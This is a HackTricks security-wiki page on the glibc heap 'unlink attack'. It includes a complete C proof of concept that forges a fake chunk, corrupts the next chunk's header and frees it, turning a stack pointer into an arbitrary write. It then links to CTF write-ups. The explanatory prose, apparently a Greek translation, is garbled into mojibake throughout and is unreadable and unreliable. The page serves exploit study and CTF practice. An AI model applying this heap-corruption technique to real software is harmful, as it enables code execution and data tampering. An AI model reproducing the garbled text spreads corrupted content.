# Unlink Attack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

ÎŒÏ„Î±Î½ Î±Î½Î±ÎºÎ±Î»ÏÏ†Î¸Î·ÎºÎµ Î±Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ·, ÎºÏ…ÏÎ¯Ï‰Ï‚ ÎµÏ€Î­Ï„ÏÎµÏ€Îµ Î­Î½Î± WWW (Write What Where), Ï‰ÏƒÏ„ÏŒÏƒÎ¿, Ï€ÏÎ¿ÏƒÏ„Î­Î¸Î·ÎºÎ±Î½ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ **Î­Î»ÎµÎ³Ï‡Î¿Î¹** Ï€Î¿Ï… ÎºÎ±Î¸Î¹ÏƒÏ„Î¿ÏÎ½ Ï„Î·Î½ Î½Î­Î± Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ Ï€Î¹Î¿ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎ± ÎºÎ±Î¹ Ï€Î¹Î¿ Ï€ÎµÏÎ¯Ï€Î»Î¿ÎºÎ· ÎºÎ±Î¹ **Î¬Ï‡ÏÎ·ÏƒÏ„Î·**.

### Code Example:

<details>

<summary>Code</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* Î— ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ tcaches (Î¼ÎµÏ„Î¬ Ï„Î·Î½ 2.26)

### Î£Ï„ÏŒÏ‡Î¿Ï‚

Î‘Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± **Î±Î»Î»Î¬Î¾ÎµÎ¹ Î­Î½Î±Ï‚ Î´ÎµÎ¯ÎºÏ„Î·Ï‚ ÏƒÎµ Î­Î½Î± chunk ÏÏƒÏ„Îµ Î½Î± Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ 3 Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ Ï„Î¿Ï…**. Î‘Î½ Î±Ï…Ï„Î® Î· Î½Î­Î± Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± (Ï€ÎµÏÎ¯Î³Ï…ÏÎ¿Ï‚ Ï„Î·Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î±Ï‚ ÏŒÏ€Î¿Ï… Î²ÏÎ¹ÏƒÎºÏŒÏ„Î±Î½ Î¿ Î´ÎµÎ¯ÎºÏ„Î·Ï‚) Î­Ï‡ÎµÎ¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î±, ÏŒÏ€Ï‰Ï‚ Î¬Î»Î»ÎµÏ‚ ÎµÎ»ÎµÎ³Ï‡ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÎºÎ±Ï„Î±Î½Î¿Î¼Î­Ï‚ / ÏƒÏ„Î¿Î¯Î²Î±..., ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î¹Î±Î²Î±ÏƒÏ„Î¿ÏÎ½/ÎµÏ€Î¹ÎºÎ±Î»Ï…Ï†Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÎºÎ»Î·Î¸ÎµÎ¯ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ· Î¶Î·Î¼Î¹Î¬.

* Î‘Î½ Î±Ï…Ï„ÏŒÏ‚ Î¿ Î´ÎµÎ¯ÎºÏ„Î·Ï‚ Î²ÏÎ¹ÏƒÎºÏŒÏ„Î±Î½ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î±, ÎµÏ€ÎµÎ¹Î´Î® Ï„ÏÏÎ± Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ 3 Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ Ï„Î¿Ï… ÎºÎ±Î¹ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î´Ï…Î½Î·Ï„Î¹ÎºÎ¬ Î½Î± Ï„Î¿ Î´Î¹Î±Î²Î¬ÏƒÎµÎ¹ ÎºÎ±Î¹ Î½Î± Ï„Î¿ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹, Î¸Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î± Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ (Î¯ÏƒÏ‰Ï‚) Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î±Î³Î³Î¯Î¾ÎµÎ¹ Ï„Î¿ canary.
* Î£Îµ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± CTF, Î±Ï…Ï„ÏŒÏ‚ Î¿ Î´ÎµÎ¯ÎºÏ„Î·Ï‚ Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ Î­Î½Î±Î½ Ï€Î¯Î½Î±ÎºÎ± Î´ÎµÎ¹ÎºÏ„ÏÎ½ ÏƒÎµ Î¬Î»Î»ÎµÏ‚ ÎºÎ±Ï„Î±Î½Î¿Î¼Î­Ï‚, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚, ÎºÎ¬Î½Î¿Î½Ï„Î¬Ï‚ Ï„Î¿Î½ Î½Î± Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ 3 Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Ï€ÏÎ¹Î½ ÎºÎ±Î¹ Î­Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î½Î± Ï„Î¿ Î´Î¹Î±Î²Î¬ÏƒÎµÎ¹ ÎºÎ±Î¹ Î½Î± Ï„Î¿ Î³ÏÎ¬ÏˆÎµÎ¹, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎºÎ¬Î½ÎµÎ¹ Ï„Î¿Ï…Ï‚ Î¬Î»Î»Î¿Ï…Ï‚ Î´ÎµÎ¯ÎºÏ„ÎµÏ‚ Î½Î± Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ ÏƒÎµ Î¬Î»Î»ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚.\
ÎšÎ±Î¸ÏÏ‚ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î´Ï…Î½Î·Ï„Î¹ÎºÎ¬ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÎ¹/Î³ÏÎ¬ÏˆÎµÎ¹ ÎºÎ±Î¹ Ï„Î¹Ï‚ Î¬Î»Î»ÎµÏ‚ ÎºÎ±Ï„Î±Î½Î¿Î¼Î­Ï‚, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î® Î½Î± ÎµÏ€Î¹ÎºÎ±Î»ÏÏˆÎµÎ¹ Î½Î­ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ ÏƒÎµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯ÎµÏ‚ (ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¿ GOT).

### Î‘Ï€Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚

* ÎšÎ¬Ï€Î¿Î¹Î¿Ï‚ Î­Î»ÎµÎ³Ï‡Î¿Ï‚ ÏƒÎµ Î¼Î½Î®Î¼Î· (Ï€.Ï‡. ÏƒÏ„Î¿Î¯Î²Î±) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ¬ chunks Î´Î¯Î½Î¿Î½Ï„Î±Ï‚ Ï„Î¹Î¼Î­Ï‚ ÏƒÎµ Î¼ÎµÏÎ¹ÎºÎ¬ Î±Ï€ÏŒ Ï„Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬.
* Î”Î¹Î±ÏÏÎ¿Î® Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î± Î³Î¹Î± Î½Î± ÏÏ…Î¸Î¼Î¹ÏƒÏ„Î¿ÏÎ½ Î¿Î¹ Î´ÎµÎ¯ÎºÏ„ÎµÏ‚ Ï„Î¿Ï… ÏˆÎµÏÏ„Î¹ÎºÎ¿Ï… chunk.

### Î•Ï€Î¯Î¸ÎµÏƒÎ·

* Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î¼ÎµÏÎ¹ÎºÎ¬ chunks (chunk1 ÎºÎ±Î¹ chunk2)
* ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î¿Ï… chunk1 ÎºÎ±Î¹ Ï„Î¹Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ Ï„Î¿Ï… chunk2.
* Î£Ï„Î¿ chunk1 Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Ï„Î· Î´Î¿Î¼Î® ÎµÎ½ÏŒÏ‚ ÏˆÎµÏÏ„Î¹ÎºÎ¿Ï… chunk:
* Î“Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Ï„Î¹Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚, Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î¿ Ï€ÎµÎ´Î¯Î¿ `size` ÎµÎ¯Î½Î±Î¹ ÏƒÏ‰ÏƒÏ„ÏŒ Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï†ÎµÏ…Ï‡Î¸ÎµÎ¯ Ï„Î¿ ÏƒÏ†Î¬Î»Î¼Î±: `corrupted size vs. prev_size while consolidating`
* ÎºÎ±Î¹ Ï„Î± Ï€ÎµÎ´Î¯Î± `fd` ÎºÎ±Î¹ `bk` Ï„Î¿Ï… ÏˆÎµÏÏ„Î¹ÎºÎ¿Ï… chunk Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ ÎµÎºÎµÎ¯ ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ Î¿ Î´ÎµÎ¯ÎºÏ„Î·Ï‚ Ï„Î¿Ï… chunk1 Î¼Îµ offsets -3 ÎºÎ±Î¹ -2 Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î±, Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ `fake_chunk->fd->bk` ÎºÎ±Î¹ `fake_chunk->bk->fd` Î½Î± Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ ÏƒÎµ Î¸Î­ÏƒÎ· ÏƒÏ„Î· Î¼Î½Î®Î¼Î· (ÏƒÏ„Î¿Î¯Î²Î±) ÏŒÏ€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ Î· Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… chunk1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* ÎŸÎ¹ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ Ï„Î¿Ï… chunk2 Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾Î¿Ï…Î½ ÏŒÏ„Î¹ Ï„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ chunk Î´ÎµÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÎºÎ±Î¹ ÏŒÏ„Î¹ Ï„Î¿ Î¼Î­Î³ÎµÎ¸Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ Î¼Î­Î³ÎµÎ¸Î¿Ï‚ Ï„Î¿Ï… ÏˆÎµÏÏ„Î¹ÎºÎ¿Ï… chunk Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÏ„Î±Î¹.
* ÎŒÏ„Î±Î½ Î±Ï€ÎµÎ»ÎµÏ…Î¸ÎµÏÏ‰Î¸ÎµÎ¯ Ï„Î¿ Î´ÎµÏÏ„ÎµÏÎ¿ chunk, Ï„ÏŒÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏˆÎµÏÏ„Î¹ÎºÎ¿ chunk Î±Ï€Î¿ÏƒÏ…Î½Î´Î­ÎµÏ„Î±Î¹ ÏƒÏ…Î¼Î²Î±Î¯Î½Î¿Î½Ï„Î±Ï‚:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Î ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ ÎµÎ¯Ï‡Îµ Î³Î¯Î½ÎµÎ¹ ÏÏƒÏ„Îµ `fake_chunk->fd->bk` ÎºÎ±Î¹ `fake_chunk->bk->fd` Î½Î± Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ ÏƒÏ„Î¿ Î¯Î´Î¹Î¿ Î¼Î­ÏÎ¿Ï‚ (Ï„Î·Î½ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÏ„Î·ÎºÎµ Ï„Î¿ `chunk1`, Î¿Ï€ÏŒÏ„Îµ Î®Ï„Î±Î½ Î¼Î¹Î± Î­Î³ÎºÏ…ÏÎ· ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î· Î»Î¯ÏƒÏ„Î±). ÎšÎ±Î¸ÏÏ‚ **ÎºÎ±Î¹ Î¿Î¹ Î´ÏÎ¿ Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ ÏƒÏ„Î·Î½ Î¯Î´Î¹Î± Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î±**, Î¼ÏŒÎ½Î¿ Î· Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± (`fake_chunk->bk->fd = fake_chunk->fd`) Î¸Î± Î­Ï‡ÎµÎ¹ **ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ·**.
* Î‘Ï…Ï„ÏŒ Î¸Î± **ÎµÏ€Î¹ÎºÎ±Î»ÏÏˆÎµÎ¹ Ï„Î¿Î½ Î´ÎµÎ¯ÎºÏ„Î· ÏƒÏ„Î¿ chunk1 ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± Î¼Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· (Î® Ï„Î± bytes) Ï€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ 3 Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Ï€ÏÎ¹Î½ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î±**.
* Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Î¾Î±Î½Î¬ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î¿Ï… chunk1, Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **Î³ÏÎ¬ÏˆÎµÎ¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î±** Î­Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î½Î± ÎµÏ€Î¹ÎºÎ±Î»ÏÏˆÎµÎ¹ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î¿ canary ÎºÎ±Î¹ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¹Ï‚ Ï„Î¹Î¼Î­Ï‚ ÎºÎ±Î¹ Ï„Î¿Ï…Ï‚ Î´ÎµÎ¯ÎºÏ„ÎµÏ‚ Ï„Ï‰Î½ Ï„Î¿Ï€Î¹ÎºÏÎ½ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½. Î‘ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¾Î±Î½Î¬ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… chunk1 Ï€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± ÏƒÎµ Î¼Î¹Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± ÏŒÏ€Î¿Ï… Î±Î½ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Î¾Î±Î½Î¬ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î¿Ï… chunk1 Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î³ÏÎ¬ÏˆÎµÎ¹ Î¿Ï€Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ.
* Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ ÎµÏ€ÎµÎ¹Î´Î® Î¿Î¹ **Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î±**. ÎŸ ÎºÎ¯Î½Î´Ï…Î½Î¿Ï‚ ÎºÎ±Î¹ Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¾Î±ÏÏ„ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ **Ï€Î¿Ï Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ Î¿Î¹ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… ÏˆÎµÏÏ„Î¹ÎºÎ¿Ï… chunk**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* Î‘Î½ ÎºÎ±Î¹ Î¸Î± Î®Ï„Î±Î½ Ï€ÎµÏÎ¯ÎµÏÎ³Î¿ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· unlink Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ ÏƒÎµ Î­Î½Î± CTF, ÎµÎ´Ï Î­Ï‡ÎµÏ„Îµ Î¼ÎµÏÎ¹ÎºÎ¬ writeups ÏŒÏ€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ Î±Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ·:
* Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± CTF: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î· ÏƒÏ„Î¿Î¯Î²Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î±Ï‚ Ï€Î¯Î½Î±ÎºÎ±Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ malloc'ed. Î— ÎµÏ€Î¯Î¸ÎµÏƒÎ· unlink ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Î¼Ï€Î¿ÏÎ­ÏƒÎµÎ¹ Î½Î± ÎºÎ±Ï„Î±Î½ÎµÎ¼Î·Î¸ÎµÎ¯ Î­Î½Î± chunk ÎµÎ´Ï, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï„Î¿Ï…Ï‚ Î´ÎµÎ¯ÎºÏ„ÎµÏ‚ Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± Ï„Ï‰Î½ malloc'ed Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Î¹Î± Î¬Î»Î»Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Ï‰Î½ chunks ÏƒÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚, Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´ÎµÎ¯Ï‡Î½Î¿Ï…Î½ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î¿ GOT, Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î¹Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ Î³Î¹Î± Î½Î± Ï€Î¬ÏÎ¿Ï…Î½ Î´Î¹Î±ÏÏÎ¿Î­Ï‚ ÎºÎ±Î¹ RCE.
* ÎˆÎ½Î± Î¬Î»Î»Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± CTF: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
